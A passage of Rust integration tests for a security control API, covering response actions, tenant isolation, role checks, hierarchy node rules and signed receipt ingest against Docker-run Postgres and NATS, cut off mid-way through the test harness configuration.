#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn response_actions_principal_lifecycle_updates_uuid_shaped_targets_and_graph_aliases() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let principal_stable_ref = Uuid::new_v4().to_string();
    let principal_id = Uuid::new_v4();

    sqlx::query::query(
        r#"INSERT INTO principals (
               id,
               tenant_id,
               principal_type,
               stable_ref,
               display_name,
               trust_level,
               lifecycle_state,
               liveness_state,
               public_key,
               metadata
           ) VALUES (
               $1,
               $2,
               'endpoint_agent',
               $3,
               'UUID-shaped Principal',
               'medium',
               'active',
               'active',
               'pk-uuid-shaped',
               '{}'::jsonb
           )"#,
    )
    .bind(principal_id)
    .bind(harness.tenant_id)
    .bind(&principal_stable_ref)
    .execute(&harness.db)
    .await
    .expect("seed uuid-shaped principal");

    for node_id in [
        format!("principal:{principal_id}"),
        format!("principal:{principal_stable_ref}"),
    ] {
        sqlx::query::query(
            r#"INSERT INTO delegation_graph_nodes (
                   tenant_id,
                   id,
                   kind,
                   label,
                   state,
                   metadata
               ) VALUES ($1, $2, 'principal', 'UUID-shaped Principal', 'active', '{}'::jsonb)"#,
        )
        .bind(harness.tenant_id)
        .bind(node_id)
        .execute(&harness.db)
        .await
        .expect("seed principal graph alias node");
    }

    let create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "actionType": "quarantine_principal",
            "target": {
                "kind": "principal",
                "id": principal_stable_ref
            },
            "reason": "Contain principal",
            "requireAcknowledgement": false,
            "payload": {}
        })),
    )
    .await;
    assert_eq!(create_resp.0, StatusCode::OK);
    let action_id = create_resp.1["id"]
        .as_str()
        .expect("response action id")
        .to_string();
    assert_eq!(create_resp.1["target"]["id"], principal_id.to_string());

    let approve_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/response-actions/{action_id}/approve"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(approve_resp.0, StatusCode::OK);
    assert_eq!(approve_resp.1["action"]["status"], "acknowledged");
    assert_eq!(
        approve_resp.1["action"]["target"]["id"],
        principal_id.to_string()
    );

    let lifecycle_state: String = sqlx::query_scalar::query_scalar(
        "SELECT lifecycle_state FROM principals WHERE tenant_id = $1 AND id = $2",
    )
    .bind(harness.tenant_id)
    .bind(principal_id)
    .fetch_one(&harness.db)
    .await
    .expect("principal lifecycle state");
    assert_eq!(lifecycle_state, "quarantined");

    let graph_states = sqlx::query::query(
        r#"SELECT id, state
           FROM delegation_graph_nodes
           WHERE tenant_id = $1
             AND id = ANY($2)
           ORDER BY id ASC"#,
    )
    .bind(harness.tenant_id)
    .bind(vec![
        format!("principal:{principal_id}"),
        format!("principal:{principal_stable_ref}"),
    ])
    .fetch_all(&harness.db)
    .await
    .expect("graph alias states");
    assert_eq!(graph_states.len(), 2);
    for row in graph_states {
        let state: Option<String> = row.try_get("state").expect("node state");
        assert_eq!(state.as_deref(), Some("quarantined"));
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn response_actions_canonicalize_endpoint_row_ids_to_public_agent_ids() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let fixture = seed_console_read_model_fixture(&harness).await;

    let create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "actionType": "policy_rule_diff_validation",
            "target": {
                "kind": "endpoint",
                "id": fixture.endpoint_agent_row_id.to_string()
            },
            "reason": "Validate endpoint policy diff",
            "requireAcknowledgement": true,
            "payload": {
                "operation": "policy_rule_diff_validation"
            }
        })),
    )
    .await;
    assert_eq!(create_resp.0, StatusCode::OK);
    assert_eq!(create_resp.1["target"]["id"], fixture.endpoint_agent_id);
    let action_id = create_resp.1["id"]
        .as_str()
        .expect("response action id")
        .to_string();

    let approve_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/response-actions/{action_id}/approve"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(approve_resp.0, StatusCode::OK);
    assert_eq!(
        approve_resp.1["deliveries"][0]["target_id"],
        fixture.endpoint_agent_id
    );
    let subject = approve_resp.1["deliveries"][0]["delivery_subject"]
        .as_str()
        .expect("delivery subject");
    assert!(subject.ends_with(&format!(".{}", fixture.endpoint_agent_id)));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn response_actions_reject_missing_or_cross_tenant_provenance() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let fixture = seed_console_read_model_fixture(&harness).await;

    let missing_detection_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "actionType": "quarantine_principal",
            "target": {
                "kind": "principal",
                "id": fixture.principal_id.to_string()
            },
            "reason": "Contain principal",
            "sourceDetectionId": Uuid::new_v4().to_string(),
            "requireAcknowledgement": false,
            "payload": {}
        })),
    )
    .await;
    assert_eq!(missing_detection_resp.0, StatusCode::NOT_FOUND);

    let other_tenant_id = Uuid::new_v4();
    let other_approval_id = Uuid::new_v4();
    sqlx::query::query(
        r#"INSERT INTO tenants (id, name, slug, plan, status, agent_limit, retention_days)
           VALUES ($1, 'Other Tenant', 'other-tenant', 'enterprise', 'active', 10, 30)"#,
    )
    .bind(other_tenant_id)
    .execute(&harness.db)
    .await
    .expect("seed other tenant");
    sqlx::query::query(
        r#"INSERT INTO approvals (
               id,
               tenant_id,
               request_id,
               agent_id,
               event_type,
               event_data,
               status
           )
           VALUES ($1, $2, $3, 'other-agent', 'manual', '{}'::jsonb, 'pending')"#,
    )
    .bind(other_approval_id)
    .bind(other_tenant_id)
    .bind(format!("approval-{other_approval_id}"))
    .execute(&harness.db)
    .await
    .expect("seed cross-tenant approval");

    let cross_tenant_approval_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "actionType": "quarantine_principal",
            "target": {
                "kind": "principal",
                "id": fixture.principal_id.to_string()
            },
            "reason": "Contain principal",
            "sourceApprovalId": other_approval_id,
            "requireAcknowledgement": false,
            "payload": {}
        })),
    )
    .await;
    assert_eq!(cross_tenant_approval_resp.0, StatusCode::NOT_FOUND);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn response_actions_reject_missing_case_references() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let fixture = seed_console_read_model_fixture(&harness).await;

    let create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/response-actions".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "actionType": "quarantine_principal",
            "target": {
                "kind": "principal",
                "id": fixture.principal_id.to_string()
            },
            "reason": "Contain principal",
            "caseId": Uuid::new_v4().to_string(),
            "requireAcknowledgement": false,
            "payload": {}
        })),
    )
    .await;
    assert_eq!(create_resp.0, StatusCode::NOT_FOUND);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn detection_rule_creates_record_api_key_actor_identity() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let api_key_id: Uuid =
        sqlx::query::query("SELECT id FROM api_keys WHERE tenant_id = $1 LIMIT 1")
            .bind(harness.tenant_id)
            .fetch_one(&harness.db)
            .await
            .expect("load api key row")
            .try_get("id")
            .expect("api key id");

    let create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/detections/rules".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "api-key-rule",
            "severity": "high",
            "source_format": "sigma",
            "execution_mode": "streaming",
            "source_text": "title: api-key-rule\nlogsource:\n  product: tetragon\ndetection:\n  selection:\n    action_type: exec\n  condition: selection\n"
        })),
    )
    .await;
    assert_eq!(create_resp.0, StatusCode::OK);
    assert_eq!(create_resp.1["created_by"], api_key_id.to_string());
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn catalog_routes_enforce_tenant_isolation_and_role_checks() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let viewer_key = "cs_it_catalog_viewer_key";
    let member_key = "cs_it_catalog_member_key";
    let other_admin_key = "cs_it_catalog_other_admin_key";
    let other_tenant_id = seed_tenant(&harness.db, "globex-catalog", "Globex Catalog").await;

    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        viewer_key,
        "catalog-viewer",
        &["viewer"],
    )
    .await;
    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        member_key,
        "catalog-member",
        &["member"],
    )
    .await;
    insert_api_key_for_tenant(
        &harness.db,
        other_tenant_id,
        other_admin_key,
        "catalog-admin",
        &["admin"],
    )
    .await;

    let create_payload = serde_json::json!({
        "name": "Tenant Baseline",
        "description": "Scoped to the owning tenant",
        "category": "general",
        "tags": ["baseline", "linux"],
        "policy_yaml": "version: \"1.0.0\"\nrules: []\n",
        "author": "Integration Test",
        "version": "1.0.0"
    });

    let create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/catalog/templates".to_string(),
        Some(&harness.api_key),
        Some(create_payload.clone()),
    )
    .await;
    assert_eq!(create_resp.0, StatusCode::OK);
    let template_id = create_resp.1["id"]
        .as_str()
        .expect("template id")
        .to_string();

    let list_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/catalog/templates?category=general&tag=baseline".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(list_resp.0, StatusCode::OK);
    assert!(list_resp
        .1
        .as_array()
        .expect("catalog templates")
        .iter()
        .any(|template| template["id"] == template_id));

    let get_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/catalog/templates/{template_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(get_resp.0, StatusCode::OK);
    assert_eq!(get_resp.1["name"], "Tenant Baseline");

    let update_resp = request_json(
        &harness.app,
        Method::PUT,
        format!("/api/v1/catalog/templates/{template_id}"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "description": "Updated tenant template",
            "version": "1.0.1"
        })),
    )
    .await;
    assert_eq!(update_resp.0, StatusCode::OK);
    assert_eq!(update_resp.1["description"], "Updated tenant template");
    assert_eq!(update_resp.1["version"], "1.0.1");

    let fork_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/catalog/templates/{template_id}/fork"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(fork_resp.0, StatusCode::OK);
    let fork_id = fork_resp.1["id"].as_str().expect("fork id").to_string();
    assert_ne!(fork_id, template_id);
    assert_eq!(fork_resp.1["forked_from"], template_id);

    let categories_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/catalog/categories".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(categories_resp.0, StatusCode::OK);
    assert!(categories_resp
        .1
        .as_array()
        .expect("catalog categories")
        .iter()
        .any(|category| category["id"] == "general"));

    let viewer_create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/catalog/templates".to_string(),
        Some(viewer_key),
        Some(create_payload.clone()),
    )
    .await;
    assert_eq!(viewer_create_resp.0, StatusCode::FORBIDDEN);

    let viewer_fork_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/catalog/templates/{template_id}/fork"),
        Some(viewer_key),
        None,
    )
    .await;
    assert_eq!(viewer_fork_resp.0, StatusCode::FORBIDDEN);

    let member_delete_resp = request_json(
        &harness.app,
        Method::DELETE,
        format!("/api/v1/catalog/templates/{template_id}"),
        Some(member_key),
        None,
    )
    .await;
    assert_eq!(member_delete_resp.0, StatusCode::FORBIDDEN);

    let other_get_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/catalog/templates/{template_id}"),
        Some(other_admin_key),
        None,
    )
    .await;
    assert_eq!(other_get_resp.0, StatusCode::NOT_FOUND);

    let other_update_resp = request_json(
        &harness.app,
        Method::PUT,
        format!("/api/v1/catalog/templates/{template_id}"),
        Some(other_admin_key),
        Some(serde_json::json!({
            "description": "cross-tenant"
        })),
    )
    .await;
    assert_eq!(other_update_resp.0, StatusCode::NOT_FOUND);

    let other_fork_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/catalog/templates/{template_id}/fork"),
        Some(other_admin_key),
        None,
    )
    .await;
    assert_eq!(other_fork_resp.0, StatusCode::NOT_FOUND);

    let delete_resp = request_json(
        &harness.app,
        Method::DELETE,
        format!("/api/v1/catalog/templates/{template_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(delete_resp.0, StatusCode::OK);
    assert_eq!(delete_resp.1["deleted"], true);

    let get_deleted_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/catalog/templates/{template_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(get_deleted_resp.0, StatusCode::NOT_FOUND);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn hierarchy_routes_support_crud_tree_and_clearable_fields() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let policy_id = Uuid::new_v4();

    let root_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Acme Org",
            "node_type": "org",
            "metadata": { "tier": "root" }
        })),
    )
    .await;
    assert_eq!(root_resp.0, StatusCode::OK);
    let root_id = root_resp.1["id"].as_str().expect("root id").to_string();

    let project_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Project Alpha",
            "node_type": "project",
            "parent_id": root_id.clone(),
            "policy_id": policy_id,
            "policy_name": "strict",
            "metadata": { "tier": "prod" }
        })),
    )
    .await;
    assert_eq!(project_resp.0, StatusCode::OK);
    let project_id = project_resp.1["id"]
        .as_str()
        .expect("project id")
        .to_string();

    let list_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(list_resp.0, StatusCode::OK);
    assert_eq!(list_resp.1.as_array().expect("hierarchy nodes").len(), 2);

    let get_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/hierarchy/nodes/{project_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(get_resp.0, StatusCode::OK);
    assert_eq!(get_resp.1["policy_name"], "strict");

    let tree_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/hierarchy/tree".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(tree_resp.0, StatusCode::OK);
    assert_eq!(tree_resp.1["root_id"], root_id);
    assert!(tree_resp.1["nodes"]
        .as_array()
        .expect("tree nodes")
        .iter()
        .any(|node| {
            node["id"] == root_id
                && node["children"]
                    .as_array()
                    .expect("root children")
                    .iter()
                    .any(|child| child.as_str() == Some(project_id.as_str()))
        }));

    // Clear policy_id, policy_name, and metadata while keeping parent_id
    // (non-org nodes must always have a parent).
    let update_resp = request_json(
        &harness.app,
        Method::PUT,
        format!("/api/v1/hierarchy/nodes/{project_id}"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Project Alpha Renamed",
            "policy_id": null,
            "policy_name": null,
            "metadata": null
        })),
    )
    .await;
    assert_eq!(update_resp.0, StatusCode::OK);
    assert_eq!(update_resp.1["name"], "Project Alpha Renamed");
    // parent_id is omitted from the update, so it stays as the root.
    assert_eq!(update_resp.1["parent_id"], root_id);
    assert!(update_resp.1["policy_id"].is_null());
    assert!(update_resp.1["policy_name"].is_null());
    assert_eq!(update_resp.1["metadata"], serde_json::json!({}));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn hierarchy_routes_enforce_permissions_and_delete_modes() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let viewer_key = "cs_it_hierarchy_viewer_key";

    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        viewer_key,
        "hierarchy-viewer",
        &["viewer"],
    )
    .await;

    let viewer_create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(viewer_key),
        Some(serde_json::json!({
            "name": "Viewer Org",
            "node_type": "org"
        })),
    )
    .await;
    assert_eq!(viewer_create_resp.0, StatusCode::FORBIDDEN);

    let root_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Root Org",
            "node_type": "org"
        })),
    )
    .await;
    assert_eq!(root_resp.0, StatusCode::OK);
    let root_id = root_resp.1["id"].as_str().expect("root id").to_string();

    let orphan_team_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Orphan Team",
            "node_type": "team"
        })),
    )
    .await;
    assert_eq!(orphan_team_resp.0, StatusCode::BAD_REQUEST);
    assert_eq!(
        orphan_team_resp.1["error"],
        "team nodes must specify a parent_id"
    );

    let team_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Team One",
            "node_type": "team",
            "parent_id": root_id.clone()
        })),
    )
    .await;
    assert_eq!(team_resp.0, StatusCode::OK);
    let team_id = team_resp.1["id"].as_str().expect("team id").to_string();

    let agent_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Agent One",
            "node_type": "agent",
            "parent_id": team_id.clone()
        })),
    )
    .await;
    assert_eq!(agent_resp.0, StatusCode::OK);
    let agent_id = agent_resp.1["id"].as_str().expect("agent id").to_string();

    let project_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Project One",
            "node_type": "project",
            "parent_id": team_id.clone()
        })),
    )
    .await;
    assert_eq!(project_resp.0, StatusCode::OK);
    let project_id = project_resp.1["id"]
        .as_str()
        .expect("project id")
        .to_string();

    let cycle_resp = request_json(
        &harness.app,
        Method::PUT,
        format!("/api/v1/hierarchy/nodes/{root_id}"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "parent_id": team_id.clone()
        })),
    )
    .await;
    assert_eq!(cycle_resp.0, StatusCode::BAD_REQUEST);
    let cycle_err = cycle_resp.1["error"].as_str().expect("cycle or type error");
    assert!(
        cycle_err.contains("cycle") || cycle_err.contains("cannot be a child of"),
        "expected cycle or type validation error, got: {cycle_err}"
    );

    let detach_team_resp = request_json(
        &harness.app,
        Method::PUT,
        format!("/api/v1/hierarchy/nodes/{team_id}"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "parent_id": null
        })),
    )
    .await;
    assert_eq!(detach_team_resp.0, StatusCode::BAD_REQUEST);
    assert_eq!(
        detach_team_resp.1["error"],
        "team nodes must specify a parent_id"
    );

    // Reparenting team's children (endpoint + project) to org should fail because
    // endpoint nodes cannot be direct children of org nodes.
    let delete_reparent_resp = request_json(
        &harness.app,
        Method::DELETE,
        format!("/api/v1/hierarchy/nodes/{team_id}?reparent=true"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(delete_reparent_resp.0, StatusCode::BAD_REQUEST);
    assert!(
        delete_reparent_resp.1["error"]
            .as_str()
            .expect("reparent error")
            .contains("cannot reparent"),
        "expected reparent type validation error, got: {}",
        delete_reparent_resp.1["error"]
    );

    // Delete without reparent (cascade) should still work.
    let delete_cascade_resp = request_json(
        &harness.app,
        Method::DELETE,
        format!("/api/v1/hierarchy/nodes/{team_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(delete_cascade_resp.0, StatusCode::OK);

    // Agent and project should be gone (cascade deleted).
    let agent_after_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/hierarchy/nodes/{agent_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(agent_after_resp.0, StatusCode::NOT_FOUND);

    let project_after_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/hierarchy/nodes/{project_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(project_after_resp.0, StatusCode::NOT_FOUND);

    let temp_team_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Temp Team",
            "node_type": "team",
            "parent_id": root_id.clone()
        })),
    )
    .await;
    assert_eq!(temp_team_resp.0, StatusCode::OK);
    let temp_team_id = temp_team_resp.1["id"]
        .as_str()
        .expect("temp team id")
        .to_string();

    let temp_leaf_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Temp Agent",
            "node_type": "agent",
            "parent_id": temp_team_id.clone()
        })),
    )
    .await;
    assert_eq!(temp_leaf_resp.0, StatusCode::OK);
    let temp_leaf_id = temp_leaf_resp.1["id"]
        .as_str()
        .expect("temp leaf id")
        .to_string();

    let delete_cascade_resp = request_json(
        &harness.app,
        Method::DELETE,
        format!("/api/v1/hierarchy/nodes/{temp_team_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(delete_cascade_resp.0, StatusCode::OK);
    assert_eq!(delete_cascade_resp.1["deleted_count"], 2);
    assert_eq!(delete_cascade_resp.1["reparented_count"], 0);

    let missing_leaf_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/hierarchy/nodes/{temp_leaf_id}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(missing_leaf_resp.0, StatusCode::NOT_FOUND);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn hierarchy_routes_reject_node_type_changes_that_strand_invalid_children() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;

    let root_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Root Org",
            "node_type": "org"
        })),
    )
    .await;
    assert_eq!(root_resp.0, StatusCode::OK);
    let root_id = root_resp.1["id"].as_str().expect("root id").to_string();

    let team_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Team One",
            "node_type": "team",
            "parent_id": root_id.clone()
        })),
    )
    .await;
    assert_eq!(team_resp.0, StatusCode::OK);
    let team_id = team_resp.1["id"].as_str().expect("team id").to_string();

    let endpoint_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Builder Host",
            "node_type": "endpoint",
            "parent_id": team_id.clone()
        })),
    )
    .await;
    assert_eq!(endpoint_resp.0, StatusCode::OK);
    let endpoint_id = endpoint_resp.1["id"]
        .as_str()
        .expect("endpoint id")
        .to_string();

    let runtime_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Claude Runtime",
            "node_type": "runtime",
            "parent_id": endpoint_id.clone()
        })),
    )
    .await;
    assert_eq!(runtime_resp.0, StatusCode::OK);

    let update_resp = request_json(
        &harness.app,
        Method::PUT,
        format!("/api/v1/hierarchy/nodes/{endpoint_id}"),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "node_type": "project"
        })),
    )
    .await;
    assert_eq!(update_resp.0, StatusCode::BAD_REQUEST);
    assert_eq!(
        update_resp.1["error"],
        "cannot change node_type: children of type [runtime] are not allowed under a project node"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn hierarchy_tree_prefers_org_root_over_other_top_level_nodes() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;

    sqlx::query::query(
        r#"INSERT INTO hierarchy_nodes (tenant_id, name, node_type, metadata)
           VALUES ($1, $2, $3, $4)"#,
    )
    .bind(harness.tenant_id)
    .bind("Orphan Project")
    .bind("project")
    .bind(serde_json::json!({ "source": "integration-test" }))
    .execute(&harness.db)
    .await
    .expect("insert orphan project");

    let root_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/hierarchy/nodes".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "name": "Canonical Org",
            "node_type": "org"
        })),
    )
    .await;
    assert_eq!(root_resp.0, StatusCode::OK);
    let root_id = root_resp.1["id"].as_str().expect("root id").to_string();

    let tree_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/hierarchy/tree".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(tree_resp.0, StatusCode::OK);
    assert_eq!(tree_resp.1["root_id"], root_id);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn receipt_ingest_rejects_viewer_but_allows_member() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let viewer_key = "cs_it_receipts_viewer_key";
    let member_key = "cs_it_receipts_member_key";

    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        viewer_key,
        "receipt-viewer",
        &["viewer"],
    )
    .await;
    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        member_key,
        "receipt-member",
        &["write"],
    )
    .await;

    let keypair = hush_core::Keypair::generate();
    let signed_receipt = hush_core::SignedReceipt::sign(
        hush_core::Receipt::new(hush_core::Hash::zero(), hush_core::Verdict::pass()),
        &keypair,
    )
    .unwrap();
    let receipt_timestamp = signed_receipt.receipt.timestamp.clone();
    let receipt_signature = signed_receipt.signatures.signer.to_hex();
    let signed_receipt_json = serde_json::to_value(&signed_receipt).unwrap();
    let receipt_payload = serde_json::json!({
        "timestamp": receipt_timestamp,
        "verdict": "allow",
        "guard": "policy_validation",
        "policy_name": "strict",
        "signature": receipt_signature,
        "public_key": keypair.public_key().to_hex(),
        "signed_receipt": signed_receipt_json,
        "metadata": {
            "client_receipt_id": "local-001"
        }
    });

    let viewer_store_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/receipts".to_string(),
        Some(viewer_key),
        Some(receipt_payload.clone()),
    )
    .await;
    assert_eq!(viewer_store_resp.0, StatusCode::FORBIDDEN);

    let viewer_batch_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/receipts/batch".to_string(),
        Some(viewer_key),
        Some(serde_json::json!({
            "receipts": [receipt_payload.clone()]
        })),
    )
    .await;
    assert_eq!(viewer_batch_resp.0, StatusCode::FORBIDDEN);

    let member_store_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/receipts".to_string(),
        Some(member_key),
        Some(receipt_payload.clone()),
    )
    .await;
    assert_eq!(member_store_resp.0, StatusCode::OK);

    let member_batch_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/receipts/batch".to_string(),
        Some(member_key),
        Some(serde_json::json!({
            "receipts": [receipt_payload]
        })),
    )
    .await;
    assert_eq!(member_batch_resp.0, StatusCode::OK);
    assert_eq!(member_batch_resp.1["count"], 1);
}

async fn setup_harness() -> Harness {
    let postgres = run_container(&[
        "run",
        "-d",
        "--rm",
        "-e",
        "POSTGRES_USER=postgres",
        "-e",
        "POSTGRES_PASSWORD=postgres",
        "-e",
        "POSTGRES_DB=cloud_api",
        "-p",
        "127.0.0.1::5432",
        "postgres:16-alpine",
    ]);
    let nats = run_container(&[
        "run",
        "-d",
        "--rm",
        "-p",
        "127.0.0.1::4222",
        "nats:2.10-alpine",
        "-js",
    ]);

    let pg_port = container_host_port(&postgres, 5432);
    let nats_port = container_host_port(&nats, 4222);
    let database_url = format!("postgres://postgres:postgres@127.0.0.1:{pg_port}/cloud_api");
    let nats_url = format!("nats://127.0.0.1:{nats_port}");

    wait_for_postgres(&database_url).await;
    wait_for_nats(&nats_url).await;

    let db = create_pool(&database_url).await.expect("create pool");
    apply_migrations(&db).await;

    let nats_client = async_nats::connect(&nats_url).await.expect("connect nats");
    let signing_keypair = Arc::new(hush_core::Keypair::generate());

    let config = Config {
        listen_addr: "127.0.0.1:0".parse().expect("listen addr"),
        database_url: database_url.clone(),
        nats_url: nats_url.clone(),
        agent_nats_url: nats_url.clone(),
        nats_provisioning_mode: "mock".to_string(),
        nats_provisioner_base_url: None,
        nats_provisioner_api_token: None,
        nats_allow_insecure_mock_provisioner: true,
        jwt_secret: "jwt-secret".to_string(),
        jwt_issuer: "clawdstrike-control-api".to_string(),
        jwt_audience: "clawdstrike-control-api".to_string(),
        stripe_secret_key: "stripe-key".to_string(),
        stripe_webhook_secret: "stripe-webhook".to_string(),
        approval_signing_enabled: true,
        approval_signing_keypair_path: None,
        approval_resolution_outbox_enabled: true,
        approval_resolution_outbox_poll_interval_secs: 5,
        audit_consumer_enabled: false,
        audit_subject_filter: "tenant-*.>".to_string(),
        audit_stream_name: "audit".to_string(),
        audit_consumer_name: "audit-consumer".to_string(),
        approval_consumer_enabled: false,
        approval_subject_filter: "tenant-*.>".to_string(),
